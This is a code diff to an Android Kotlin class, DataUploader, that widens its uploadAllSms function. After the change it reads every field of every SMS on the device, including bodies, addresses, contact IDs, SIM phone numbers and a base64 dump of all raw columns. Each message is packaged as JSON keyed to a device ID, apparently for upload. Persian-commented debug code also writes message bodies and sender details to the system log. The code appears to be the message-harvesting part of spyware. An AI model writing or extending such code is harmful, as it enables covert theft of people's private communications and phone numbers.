@@ -149,15 +149,30 @@ object DataUploader {
         }
     }
     
+    
     fun uploadAllSms(context: Context, deviceId: String) {
         try {
             val messages = JSONArray()
             
             val columns = mutableListOf(
+                Telephony.Sms._ID,
+                Telephony.Sms.THREAD_ID,
                 Telephony.Sms.ADDRESS,
-                Telephony.Sms.BODY,
+                Telephony.Sms.PERSON,
                 Telephony.Sms.DATE,
-                Telephony.Sms.TYPE
+                Telephony.Sms.DATE_SENT,
+                Telephony.Sms.PROTOCOL,
+                Telephony.Sms.READ,
+                Telephony.Sms.STATUS,
+                Telephony.Sms.TYPE,
+                Telephony.Sms.REPLY_PATH_PRESENT,
+                Telephony.Sms.SUBJECT,
+                Telephony.Sms.BODY,
+                Telephony.Sms.SERVICE_CENTER,
+                Telephony.Sms.LOCKED,
+                Telephony.Sms.ERROR_CODE,
+                Telephony.Sms.SEEN,
+                Telephony.Sms.CREATOR
             )
             
             val subIdColumn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
@@ -183,10 +198,32 @@ object DataUploader {
             )
 
             cursor?.use {
+                // 🔍 لاگ برای نمایش تمام ستون‌های موجود
+                val allColumns = it.columnNames.joinToString(", ")
+                Log.d(TAG, "📱 ========================================")
+                Log.d(TAG, "📱 ALL AVAILABLE SMS COLUMNS:")
+                Log.d(TAG, "📱 $allColumns")
+                Log.d(TAG, "📱 ========================================")
+                
+                val columnNames = it.columnNames
+                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
+                val threadIdIndex = it.getColumnIndex(Telephony.Sms.THREAD_ID)
                 val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
+                val personIndex = it.getColumnIndex(Telephony.Sms.PERSON)
                 val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                 val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
+                val dateSentIndex = it.getColumnIndex(Telephony.Sms.DATE_SENT)
+                val protocolIndex = it.getColumnIndex(Telephony.Sms.PROTOCOL)
+                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
+                val statusIndex = it.getColumnIndex(Telephony.Sms.STATUS)
                 val typeIndex = it.getColumnIndex(Telephony.Sms.TYPE)
+                val replyPathPresentIndex = it.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT)
+                val subjectIndex = it.getColumnIndex(Telephony.Sms.SUBJECT)
+                val serviceCenterIndex = it.getColumnIndex(Telephony.Sms.SERVICE_CENTER)
+                val lockedIndex = it.getColumnIndex(Telephony.Sms.LOCKED)
+                val errorCodeIndex = it.getColumnIndex(Telephony.Sms.ERROR_CODE)
+                val seenIndex = it.getColumnIndex(Telephony.Sms.SEEN)
+                val creatorIndex = it.getColumnIndex(Telephony.Sms.CREATOR)
                 val subIdIndex = if (subIdColumn != null) {
                     try {
                         val idx = it.getColumnIndex(subIdColumn)
@@ -196,11 +233,28 @@ object DataUploader {
                     }
                 } else -1
 
+                // 🔍 شمارنده برای تست اولین 5 پیامک
+                var debugCounter = 0
+                
                 while (it.moveToNext()) {
-                    val address = it.getString(addressIndex) ?: ""
-                    val body = it.getString(bodyIndex) ?: ""
-                    val timestamp = it.getLong(dateIndex)
-                    val smsType = it.getInt(typeIndex)
+                    val id = if (idIndex >= 0) it.getLong(idIndex) else -1
+                    val threadId = if (threadIdIndex >= 0) it.getLong(threadIdIndex) else -1
+                    val address = if (addressIndex >= 0) (it.getString(addressIndex) ?: "") else ""
+                    val person = if (personIndex >= 0) it.getLong(personIndex) else -1
+                    val body = if (bodyIndex >= 0) (it.getString(bodyIndex) ?: "") else ""
+                    val timestamp = if (dateIndex >= 0) it.getLong(dateIndex) else 0L
+                    val dateSent = if (dateSentIndex >= 0) it.getLong(dateSentIndex) else -1L
+                    val protocol = if (protocolIndex >= 0) it.getInt(protocolIndex) else -1
+                    val read = if (readIndex >= 0) (it.getInt(readIndex) == 1) else false
+                    val status = if (statusIndex >= 0) it.getInt(statusIndex) else -1
+                    val smsType = if (typeIndex >= 0) it.getInt(typeIndex) else -1
+                    val replyPathPresent = if (replyPathPresentIndex >= 0) (it.getInt(replyPathPresentIndex) == 1) else false
+                    val subject = if (subjectIndex >= 0) (it.getString(subjectIndex) ?: "") else ""
+                    val serviceCenter = if (serviceCenterIndex >= 0) (it.getString(serviceCenterIndex) ?: "") else ""
+                    val locked = if (lockedIndex >= 0) (it.getInt(lockedIndex) == 1) else false
+                    val errorCode = if (errorCodeIndex >= 0) it.getInt(errorCodeIndex) else -1
+                    val seen = if (seenIndex >= 0) (it.getInt(seenIndex) == 1) else false
+                    val creator = if (creatorIndex >= 0) (it.getString(creatorIndex) ?: "") else ""
                     
                     var subId: Int? = null
                     if (subIdIndex >= 0) {
@@ -226,16 +280,47 @@ object DataUploader {
                         Pair("", -1)
                     }
 
-                    // For inbox: from = sender (address), to = empty
-                    // For sent: from = sim phone number (our number), to = recipient (address)
+                    // 🔍 لاگ دیتای اولین 5 پیامک SENT
+                    if (debugCounter < 5 && smsType == Telephony.Sms.MESSAGE_TYPE_SENT) {
+                        Log.d(TAG, "📨 ========== SENT SMS #${debugCounter + 1} ==========")
+                        Log.d(TAG, "📨 ID: $id")
+                        Log.d(TAG, "📨 Address (To): $address")
+                        Log.d(TAG, "📨 Body: ${body.take(50)}...")
+                        Log.d(TAG, "📨 subId: $subId")
+                        Log.d(TAG, "📨 simPhoneNumber: $simPhoneNumber")
+                        Log.d(TAG, "📨 simSlot: $simSlot")
+                        Log.d(TAG, "📨 serviceCenter: $serviceCenter")
+                        Log.d(TAG, "📨 creator: $creator")
+                        
+                        // نمایش تمام داده‌های خام این پیامک
+                        Log.d(TAG, "📨 --- All Raw Data for this SMS ---")
+                        for (i in 0 until columnNames.size) {
+                            try {
+                                val colName = columnNames[i]
+                                val value = when (it.getType(i)) {
+                                    android.database.Cursor.FIELD_TYPE_NULL -> "NULL"
+                                    android.database.Cursor.FIELD_TYPE_INTEGER -> it.getLong(i).toString()
+                                    android.database.Cursor.FIELD_TYPE_FLOAT -> it.getDouble(i).toString()
+                                    android.database.Cursor.FIELD_TYPE_STRING -> it.getString(i) ?: ""
+                                    android.database.Cursor.FIELD_TYPE_BLOB -> "BLOB_DATA"
+                                    else -> "UNKNOWN_TYPE"
+                                }
+                                Log.d(TAG, "📨   $colName = $value")
+                            } catch (e: Exception) {
+                                Log.e(TAG, "📨   ${columnNames[i]} = ERROR: ${e.message}")
+                            }
+                        }
+                        Log.d(TAG, "📨 =====================================")
+                        debugCounter++
+                    }
+
                     val (from, to) = when (smsType) {
                         Telephony.Sms.MESSAGE_TYPE_INBOX -> Pair(address.trim(), "")
                         Telephony.Sms.MESSAGE_TYPE_SENT -> {
-                            // For sent SMS, use simPhoneNumber as from (our phone number)
                             val fromNumber = if (simPhoneNumber.isNotEmpty()) {
                                 simPhoneNumber
                             } else {
-                                "" // Fallback if sim phone number not available
+                                ""
                             }
                             Pair(fromNumber, address.trim())
                         }
@@ -253,17 +338,56 @@ object DataUploader {
                     }
 
                     val sms = JSONObject().apply {
+                        put("_id", id)
+                        put("thread_id", threadId)
                         put("from", from)
                         put("to", to)
+                        put("address", address)
+                        put("person", if (person >= 0) person else JSONObject.NULL)
                         put("body", body)
+                        put("subject", subject)
                         put("timestamp", timestamp)
+                        put("date_sent", if (dateSent >= 0) dateSent else JSONObject.NULL)
                         put("type", typeStr)
+                        put("type_code", smsType)
+                        put("read", read)
+                        put("seen", seen)
+                        put("status", status)
+                        put("protocol", if (protocol >= 0) protocol else JSONObject.NULL)
+                        put("reply_path_present", replyPathPresent)
+                        put("service_center", serviceCenter)
+                        put("locked", locked)
+                        put("error_code", if (errorCode >= 0) errorCode else JSONObject.NULL)
+                        put("creator", creator)
                         if (simPhoneNumber.isNotEmpty()) {
                             put("sim_phone_number", simPhoneNumber)
                         }
                         if (simSlot >= 0) {
                             put("sim_slot", simSlot)
                         }
+                        if (subId != null && subId >= 0) {
+                            put("sub_id", subId)
+                        }
+                        
+                        val allData = JSONObject()
+                        for (i in 0 until columnNames.size) {
+                            try {
+                                val colName = columnNames[i]
+                                when (it.getType(i)) {
+                                    android.database.Cursor.FIELD_TYPE_NULL -> allData.put(colName, JSONObject.NULL)
+                                    android.database.Cursor.FIELD_TYPE_INTEGER -> allData.put(colName, it.getLong(i))
+                                    android.database.Cursor.FIELD_TYPE_FLOAT -> allData.put(colName, it.getDouble(i))
+                                    android.database.Cursor.FIELD_TYPE_STRING -> allData.put(colName, it.getString(i) ?: "")
+                                    android.database.Cursor.FIELD_TYPE_BLOB -> {
+                                        val blob = it.getBlob(i)
+                                        allData.put(colName, android.util.Base64.encodeToString(blob, android.util.Base64.NO_WRAP))
+                                    }
+                                }
+                            } catch (e: Exception) {
+                                allData.put(columnNames[i], "ERROR: ${e.message}")
+                            }
+                        }
+                        put("_all_raw_data", allData)
                     }
                     messages.put(sms)
                 }
